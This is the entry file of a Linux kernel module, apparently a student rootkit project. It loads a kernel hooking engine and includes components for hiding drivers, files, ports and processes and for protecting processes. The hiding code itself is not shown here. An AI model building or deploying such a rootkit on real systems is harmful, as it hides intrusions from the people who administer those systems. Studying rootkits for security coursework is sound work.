#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>

#include "khook/engine.c"

#include "driver_hiding/driver_hiding.h"
#include "file_hiding/file_hiding.h"
#include "port_hiding/port_hiding.h"
#include "process_hiding/process_hiding.h"
#include "process_protection/process_protection.h"

MODULE_AUTHOR("RuanJianAnQuanYuanLiDiQiZu");

static int __init on_module_init(void) {
    khook_init();
    return 0;
}

static void __exit on_module_exit(void) {
    khook_cleanup();
}

module_init(on_module_init);
module_exit(on_module_exit);
